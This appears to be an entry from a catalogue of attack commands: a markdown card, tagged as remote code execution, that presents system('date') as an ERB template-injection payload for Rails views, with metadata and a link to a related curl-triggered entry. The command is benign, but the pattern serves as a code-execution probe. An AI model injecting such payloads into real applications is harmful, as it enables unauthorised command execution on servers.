---
data: system('date')
tags:
  - ruby
  - rce
type: command
output: Current date and time output
executor: ruby
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.331Z'
id: db9038a9-4558-4429-b281-eff7d73a9076
verified: false
validated: true
submitted: true
---
# system-date-execution

## Command

```ruby
system('date')
```

## Description

Execute the date command via ERB payload in Rails view.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'date' | Command | Yes |

## Examples

### Basic Usage

```ruby
system('date')
```

## Expected Output

Mon Jan  1 12:00:00 UTC 2024

## Related

- [[commands/curl-trigger-rce]]
